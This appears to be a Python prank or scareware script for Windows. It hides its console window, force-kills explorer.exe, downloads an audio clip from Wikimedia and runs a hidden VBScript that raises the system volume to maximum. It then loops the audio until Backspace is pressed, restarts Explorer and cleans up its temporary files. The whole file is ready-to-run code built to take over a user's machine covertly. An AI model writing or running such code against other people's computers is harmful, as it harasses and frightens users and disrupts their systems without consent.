import ctypes
import time
import os
import urllib.request
import subprocess
import tempfile
import uuid

# --- Constants & Configuration ---
URL = "https://upload.wikimedia.org/wikipedia/commons/transcoded/6/67/LL-Q34311_%28yor%29-Abike25-Adewale_Adeyinka.wav/LL-Q34311_%28yor%29-Abike25-Adewale_Adeyinka.wav.mp3"
VK_BACK = 0x08
SW_HIDE = 0

# --- Windows API Loading ---
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
winmm = ctypes.windll.winmm

def hide_console():
    """Hides the console window."""
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        user32.ShowWindow(hwnd, SW_HIDE)

def set_max_volume():
    """
    Sets the system volume to max using a VBScript hack.
    """
    try:
        # Create a tiny VBS script to spam Volume Up
        vbs_content = 'Set WshShell = CreateObject("WScript.Shell")\n'
        # Loop 50 times sending key 175 (Vol Up)
        vbs_content += 'For i = 0 To 50\n WshShell.SendKeys(chr(175))\nNext'
        
        vbs_path = os.path.join(tempfile.gettempdir(), f"vol_{uuid.uuid4()}.vbs")
        with open(vbs_path, "w") as f:
            f.write(vbs_content)
        
        # Run it blindly
        subprocess.run(["cscript", "//Nologo", vbs_path], creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(0.5)
        os.remove(vbs_path)
    except Exception:
        pass # Best effort

def play_audio_loop(file_path):
    """
    Plays audio using MCI (Media Control Interface).
    """
    alias = "hidden_music"
    
    # 1. Open
    cmd_open = f'open "{file_path}" type mpegvideo alias {alias}'
    ret = winmm.mciSendStringW(cmd_open, None, 0, 0)
    if ret != 0:
        return False # Failed to open

    # 2. Set Volume (MCI volume is 0-1000)
    winmm.mciSendStringW(f"setaudio {alias} volume to 1000", None, 0, 0)

    # 3. Play (Repeat)
    winmm.mciSendStringW(f"play {alias} repeat", None, 0, 0)
    return True

def stop_audio():
    winmm.mciSendStringW("close hidden_music", None, 0, 0)

def main():
    # 1. Hide Window Immediately
    hide_console()

    # 2. Kill Explorer
    try:
        subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], 
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

    temp_audio_path = ""
    
    try:
        # 3. Download File
        filename = f"hidden_audio_{uuid.uuid4()}.mp3"
        temp_audio_path = os.path.join(tempfile.gettempdir(), filename)
        
        # Wikimedia requires a User-Agent or it returns 403
        req = urllib.request.Request(URL, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
        
        with urllib.request.urlopen(req) as response, open(temp_audio_path, 'wb') as out_file:
            out_file.write(response.read())

        # 4. Max Volume
        set_max_volume()

        # 5. Play Audio
        if play_audio_loop(temp_audio_path):
            # 6. Loop until Backspace
            while True:
                if user32.GetAsyncKeyState(VK_BACK) & 0x8000:
                    break
                time.sleep(0.1)

    finally:
        # 7. Restore & Cleanup
        stop_audio()
        
        # Restart Explorer (non-blocking)
        try:
            subprocess.Popen(["explorer.exe"])
        except Exception:
            pass
        
        time.sleep(1)
        if temp_audio_path and os.path.exists(temp_audio_path):
            try:
                os.remove(temp_audio_path)
            except OSError:
                pass

if __name__ == "__main__":
    main()
